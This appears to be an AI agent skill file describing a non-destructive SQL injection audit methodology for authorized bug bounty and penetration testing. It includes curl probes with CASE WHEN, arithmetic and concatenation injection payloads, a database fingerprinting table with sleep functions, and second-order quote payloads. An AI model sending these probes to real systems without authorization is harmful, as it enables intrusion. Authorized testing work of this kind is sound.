---
name: hunt-sqliv2
description: Audit SQL query integrity and modern ORM vulnerabilities.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, jq
metadata:
  tags: [sqli, audit, database, orm, reporting]
  category: redteam
  related_skills:
    - hunt-sqli
    - hunt-nosqli
    - triage-validation
---

# HUNT-SQLIv2 — Modern SQL & ORM Query Integrity Audit

Advanced assessment methodology for auditing SQL query integrity and modern ORM vulnerabilities. Built for authorized bug bounty, web application penetration testing, and code audits. Focuses on modern vulnerability zones (dynamic `ORDER BY` identifiers, raw ORM escape hatches, and second-order flows) using safe, non-destructive differential verification.

---

## When to Use

- Auditing web applications, REST APIs, or GraphQL backends that interact with relational databases.
- Testing endpoints with sortable headers, dynamic filters, analytics aggregations, or export functions.
- Evaluating applications built on modern ORMs (Django, Hibernate, Sequelize, Prisma, Entity Framework) where standard CRUD is parameterized but raw query escape hatches or dynamic sorting are used.
- Validating whether an observed anomaly or database error is an exploitable query integrity flaw while avoiding destructive operations.

---

## Prerequisites

- Target in authorized scope with explicit testing permission.
- Standard tools installed: `curl`, `jq`.
- Set writable output directory:
  ```bash
  export OUTPUT_DIR="${OUTPUT_DIR:-./output}"
  mkdir -p "$OUTPUT_DIR"
  ```
- Two test accounts (User A and User B) for second-order and multi-tenant isolation tests.

---

## How to Run

```bash
TARGET="target.com"
OUTPUT_DIR="${OUTPUT_DIR:-./output}"
mkdir -p "$OUTPUT_DIR/$TARGET/sqli"

# 1. Baseline Request (Measure normal latency and response content)
curl -sk --max-time 10 "https://$TARGET/api/v1/items?sort=created_at&direction=ASC" \
  -o "$OUTPUT_DIR/$TARGET/sqli/baseline.json"

# 2. Invariance Verification (Evaluate conditional expression handling)
curl -sk --max-time 10 "https://$TARGET/api/v1/items?sort=(CASE+WHEN+(1=1)+THEN+created_at+ELSE+id+END)&direction=ASC" \
  -o "$OUTPUT_DIR/$TARGET/sqli/true_condition.json"

curl -sk --max-time 10 "https://$TARGET/api/v1/items?sort=(CASE+WHEN+(1=2)+THEN+created_at+ELSE+id+END)&direction=ASC" \
  -o "$OUTPUT_DIR/$TARGET/sqli/false_condition.json"

# 3. Compare output behavior
diff -u "$OUTPUT_DIR/$TARGET/sqli/true_condition.json" "$OUTPUT_DIR/$TARGET/sqli/false_condition.json"
```

---

## Procedure

### Step 1: Reconnaissance & Surface Categorization

Map parameters and group them by database interaction type:

1. **Dynamic Identifiers & Sorters**:
   - `?sort=`, `?order_by=`, `?column=`, `?sort_field=`
   - `?order=ASC|DESC`, `?dir=1|0`
   - *Why High-Risk*: SQL placeholders (`?` or `$1`) cannot bind column or table identifiers. Developers frequently use string concatenation here.
2. **Analytical Filters & Aggregations**:
   - `?from=`, `?to=`, `?date_range=`
   - `?status=`, `?type=`, `?group_by=`
   - Custom report builders and CSV/PDF export endpoints.
3. **JSON & Nested Model Properties**:
   - APIs querying PostgreSQL JSONB (`data->>'key'`) or MySQL JSON (`JSON_EXTRACT`).
4. **Second-Order Candidate Sinks**:
   - Profile names, organization titles, webhook URLs, and invite tags that get rendered in delayed admin exports or nightly billing batch jobs.

---

### Step 2: Establish Stable Baseline

Before testing any parameter, establish baseline metrics over 3 consecutive requests:
```bash
for i in {1..3}; do
  curl -sk --max-time 10 -w "HTTP: %{http_code} | Time: %{time_total}s | Bytes: %{size_download}\n" \
    -o /dev/null "https://$TARGET/api/v1/items?sort=created_at"
  sleep 1
done
```
- Record average response time ($\mu$) and size variance.
- Strip dynamic fields (timestamps, CSRF tokens) when comparing responses.

---

### Step 3: Differential Context Testing (Non-Destructive)

Apply differential evaluation tailored to the specific query context:

#### Context A: Dynamic Identifier / ORDER BY Context
Because standard quotes break the query, test inline conditional branches:
```bash
# True evaluation (should sort by created_at)
curl -sk --max-time 10 "https://$TARGET/api/v1/items?sort=(CASE+WHEN+(1=1)+THEN+created_at+ELSE+id+END)"

# False evaluation (should sort by fallback id)
curl -sk --max-time 10 "https://$TARGET/api/v1/items?sort=(CASE+WHEN+(1=2)+THEN+created_at+ELSE+id+END)"
```
- **Finding Signal**: True condition matches the baseline order; False condition deterministically switches the sort sequence.

#### Context B: Numeric Identifier Context (Arithmetic Invariance)
On numeric endpoints (e.g. `?item_id=10`):
```bash
# Baseline
curl -sk --max-time 10 "https://$TARGET/api/v1/item?id=10" -o baseline.json

# Evaluative calculations
curl -sk --max-time 10 "https://$TARGET/api/v1/item?id=11-1" -o eval1.json
curl -sk --max-time 10 "https://$TARGET/api/v1/item?id=9+1" -o eval2.json
```
- **Finding Signal**: `id=11-1` and `id=9+1` return item `10` instead of a 400 error or not found, proving mathematical evaluation by the database engine.

#### Context C: String Context (Concatenation Invariance)
On string lookup endpoints (e.g. `?username=alice`):
```bash
# Standard ANSI concatenation (PostgreSQL / SQLite / Oracle)
curl -sk --max-time 10 "https://$TARGET/api/v1/users?name=al'||'ice"

# MySQL native concatenation
curl -sk --max-time 10 "https://$TARGET/api/v1/users?name=concat('al','ice')"
```
- **Finding Signal**: The concatenated string returns the exact same user profile as `alice`.

---

### Step 4: Dialect Fingerprinting Matrix

Identify backend technology through observable language-specific behavior:

| Dialect | String Concatenation | Native Identifiers | Sleep Function | Distinctive Features |
|---|---|---|---|---|
| **PostgreSQL** | `'a' \|\| 'b'` | `"column"` | `pg_sleep(2)` | Type-cast `::text`; JSON `->>` |
| **MySQL / MariaDB** | `CONCAT('a','b')` | `` `column` `` | `sleep(2)` | Inline `#` comments |
| **MS SQL Server** | `'a' + 'b'` | `[column]` | `WAITFOR DELAY '0:0:2'` | Schema `sys.tables` |
| **Oracle** | `'a' \|\| 'b'` | `"COLUMN"` | `DBMS_PIPE.RECEIVE_MESSAGE` | Mandatory `FROM DUAL` |
| **SQLite** | `'a' \|\| 'b'` | `"column"` or `` `column` `` | N/A | Table catalog `sqlite_master` |

---

### Step 5: Second-Order Flow Tracking

1. Inject non-destructive tracking identifiers into profile or organization fields:
   ```json
   {
     "organization_name": "AuditTest '",
     "billing_tag": "tag123'\""
   }
   ```
2. Trigger downstream secondary processes:
   - Export invoice/records to CSV/PDF.
   - Run audit log generation.
3. Observe whether secondary endpoints fail with database parser exceptions.

---

## Pitfalls

- **Confusing WAF Blocks with Database Errors**: An immediate HTTP 403/406 with generic HTML is a firewall rule, not SQL interpretation.
- **Uncontrolled Data Dumping**: Indiscriminate database dumps violate program rules and privacy laws. Proof of vulnerability requires only demonstrating query structure control.
- **Network Latency False Positives**: Never declare time-based injection based on a single slow request. Validate that latency consistently scales with injected sleep values across multiple runs while control requests remain fast.
- **Destructive Payloads**: Never send `DROP`, `UPDATE`, `DELETE`, or `INSERT` statements against production assets.

---

## Verification

Before filing any finding, confirm against all verification gates:

- [ ] **Deterministic Reproducibility**: The differential behavior reproduces across multiple runs from a clean session.
- [ ] **Dual-State Validation**: Both true-state and false-state behaviors are documented and behave opposite to each other.
- [ ] **Negative Controls**: Benign characters do not trigger the anomaly; non-SQL random strings produce expected 400/404 handling.
- [ ] **Artifact Hygiene**: Request and response transcripts are saved under `${OUTPUT_DIR}/<target>/sqli/` with sensitive tokens redacted.
- [ ] **Root-Cause Clarification**: Clearly identify whether the issue is an unvalidated `ORDER BY` identifier, an ORM raw fragment (`.extra()`, `.literal()`), or unescaped string formatting.
